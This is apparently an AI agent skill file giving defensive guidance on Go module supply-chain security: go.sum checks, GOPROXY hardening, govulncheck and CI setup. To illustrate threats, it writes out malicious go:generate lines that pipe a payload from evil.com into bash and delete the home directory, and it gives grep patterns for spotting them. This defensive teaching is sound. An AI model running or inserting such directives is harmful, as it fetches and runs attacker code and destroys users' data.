---
name: supply-chain-secure-install
description: Use when adding, updating, or auditing Go module dependencies. Provides supply chain attack countermeasures including go.sum verification, GOPROXY hardening, govulncheck auditing, and CI/CD pipeline security. Adapted from Shai-Hulud npm attack lessons.
allowed-tools: Read, Write, Edit, Bash, Grep, Glob
user-invocable: true
---

# Supply Chain Secure Install (Go Modules)

This skill provides comprehensive defense-in-depth guidelines for safe dependency management with Go modules, adapted from lessons learned from the Shai-Hulud npm supply chain attacks (2025). While Go's module system is inherently more secure than npm's, supply chain attacks targeting Go have occurred and the same principles apply.

## When to Apply

Apply these guidelines when:
- Adding new dependencies (`go get`)
- Updating existing dependencies (`go get -u`)
- Setting up CI/CD pipelines
- Auditing current project dependency security posture
- Reviewing pull requests that modify `go.mod` or `go.sum`

## Go vs npm: Built-in Security Advantages

Go modules have significant structural advantages over npm that mitigate Shai-Hulud-style attacks:

| Feature | npm (Shai-Hulud vector) | Go Modules |
|---------|------------------------|------------|
| Lifecycle scripts | `preinstall`/`postinstall` execute arbitrary code | **No equivalent** - no code runs on `go get` |
| Dependency resolution | Mutable versions, can overwrite | **Immutable** - module versions are append-only |
| Integrity verification | Optional (package-lock.json) | **Mandatory** - go.sum checksums verified against sumdb |
| Global checksum DB | None | **sum.golang.org** - tamper-evident checksum database |
| Module proxy | npm registry (single point) | **GOPROXY** - cacheable, verifiable proxy layer |

**However, Go is NOT immune.** Attack vectors include:
- `go generate` directives executing arbitrary commands
- Build-time code (cgo, compiler plugins)
- Malicious code in imported packages that executes at runtime
- Typosquatting on module paths
- Compromised module proxy or VCS accounts

## go.sum Integrity Verification

### How It Works

Every module version fetched is checksummed and recorded in `go.sum`. Before using any module, Go verifies:
1. The module content matches the hash in `go.sum`
2. The hash matches the global checksum database (sum.golang.org)

### Mandatory Practices

```bash
# Always commit both go.mod AND go.sum
git add go.mod go.sum

# Verify checksums are consistent
go mod verify

# In CI: ensure no modifications to go.sum
go mod download
go mod verify
```

### GONOSUMCHECK / GONOSUMDB

```bash
# NEVER globally disable checksum verification
# BAD:
GONOSUMCHECK=* go get example.com/pkg

# Only disable for genuinely private modules:
GONOSUMCHECK=private.company.com/* go get private.company.com/internal/pkg
GONOSUMDB=private.company.com/*
```

## GOPROXY Hardening

### Default Configuration

```bash
# Default (recommended for most projects)
GOPROXY=https://proxy.golang.org,direct

# For organizations: use a private proxy for additional control
GOPROXY=https://your-private-proxy.example.com,https://proxy.golang.org,direct
```

### Private Proxy Benefits

| Benefit | Description |
|---------|-------------|
| Caching | Modules cached even if upstream is deleted |
| Auditing | Log all module fetches |
| Allowlisting | Restrict which modules can be fetched |
| Scanning | Integrate vulnerability scanning |

Options: Athens, Artifactory, Nexus

### GOFLAGS for Default Security

```bash
# In .envrc or CI environment:
export GOFLAGS="-mod=readonly"
# Prevents go.mod/go.sum modification during build
```

## go generate Security

`go generate` is Go's equivalent of npm lifecycle scripts -- it can execute **arbitrary commands**.

### Threat: Malicious go:generate Directives

```go
// A compromised dependency could contain:
//go:generate curl -sSL https://evil.com/payload.sh | bash
//go:generate rm -rf ~/

// Or more subtly:
//go:generate go run ./internal/codegen  // runs attacker-controlled code
```

### Defense

1. **NEVER run `go generate` on untrusted code**
2. **Review `go:generate` directives** in new dependencies:

```bash
# Find all go:generate directives in dependencies
grep -r "//go:generate" vendor/ 2>/dev/null
# Or in module cache:
grep -r "//go:generate" $(go env GOMODCACHE) 2>/dev/null
```

3. **In CI: separate generate from build**

```yaml
# Do NOT run go generate in CI unless absolutely necessary
# If required, run in a sandboxed environment
steps:
  - name: Build (no generate)
    run: go build ./...
```

## Dependency Audit

### govulncheck (Mandatory)

```bash
# Install govulncheck
go install golang.org/x/vuln/cmd/govulncheck@latest

# Check for known vulnerabilities
govulncheck ./...

# In CI:
- name: Vulnerability check
  run: govulncheck ./...
```

### Pre-Install Dependency Review

Before `go get <module>`:

```bash
# 1. Check the module on pkg.go.dev
# Verify: license, import count, last update, repository

# 2. Review the module source
go doc <module>

# 3. Check for known vulnerabilities
govulncheck -test ./...

# 4. Check module dependencies (transitive)
go mod graph | grep <module>
```

### Red Flags During Review

| Red Flag | Risk |
|----------|------|
| Module not on pkg.go.dev | Unverified, possibly malicious |
| Very few importers | Potential typosquatting |
| Recent repository transfer | Possible account takeover |
| Contains `go:generate` directives | Arbitrary code execution |
| Uses cgo extensively | Native code can bypass Go safety |
| Imports `os/exec` or `net/http` | May exfiltrate data or execute commands |
| replace directives in go.mod | May redirect to malicious modules |

## CI/CD Pipeline Security

### Secure Go Build in CI

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@<SHA>
        with:
          persist-credentials: false

      - uses: actions/setup-go@<SHA>
        with:
          go-version-file: go.mod

      # Verify module integrity
      - name: Verify modules
        run: go mod verify

      # Check for vulnerabilities
      - name: Vulnerability check
        run: |
          go install golang.org/x/vuln/cmd/govulncheck@latest
          govulncheck ./...

      # Build with readonly modules
      - name: Build
        env:
          GOFLAGS: "-mod=readonly"
        run: go build ./...

      # Test
      - name: Test
        run: go test ./...
```

### Environment Variable Protection

```yaml
# GOOD: only expose GOPRIVATE for private module access
steps:
  - name: Download modules
    env:
      GOPRIVATE: private.company.com/*
      # GITHUB_TOKEN only if accessing private repos
    run: go mod download

  - name: Build (no secrets needed)
    run: go build ./...
```

## Periodic Audit Checklist

```bash
# 1. Check for known vulnerabilities
govulncheck ./...

# 2. Verify module integrity
go mod verify

# 3. Check for unnecessary dependencies
go mod tidy
git diff go.mod go.sum  # Review removals

# 4. List all direct dependencies
go list -m all

# 5. Check for updates
go list -m -u all
```

## Emergency Response: Suspected Compromise

1. **Do NOT run `go generate`** on the affected project
2. **Check go.sum** for unexpected hash changes
3. **Run `go mod verify`** to check integrity
4. **Run `govulncheck`** to check for known vulnerabilities
5. **Pin to a known-good version** in go.mod with exact version
6. **Rotate credentials** if malicious code may have executed
7. **Report** to the Go security team and module maintainers

## Post-Compromise Detection

```bash
# Check for unexpected go:generate directives in dependencies
grep -r "//go:generate" $(go env GOMODCACHE) 2>/dev/null | head -50

# Check for suspicious imports in dependencies
grep -r "os/exec\|net/http\|io/ioutil" $(go env GOMODCACHE) 2>/dev/null | \
  grep -v "_test.go" | head -50

# Verify go.sum hasn't been tampered with
go mod verify

# Check for replace directives pointing to unexpected locations
grep "replace" go.mod
```

## References

- [Go Module Reference - Authenticating Modules](https://go.dev/ref/mod#authenticating)
- [Go Checksum Database](https://sum.golang.org/)
- [govulncheck](https://pkg.go.dev/golang.org/x/vuln/cmd/govulncheck)
- [Shai-Hulud 2.0 - Lessons for All Ecosystems](https://www.trendmicro.com/en_us/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html)
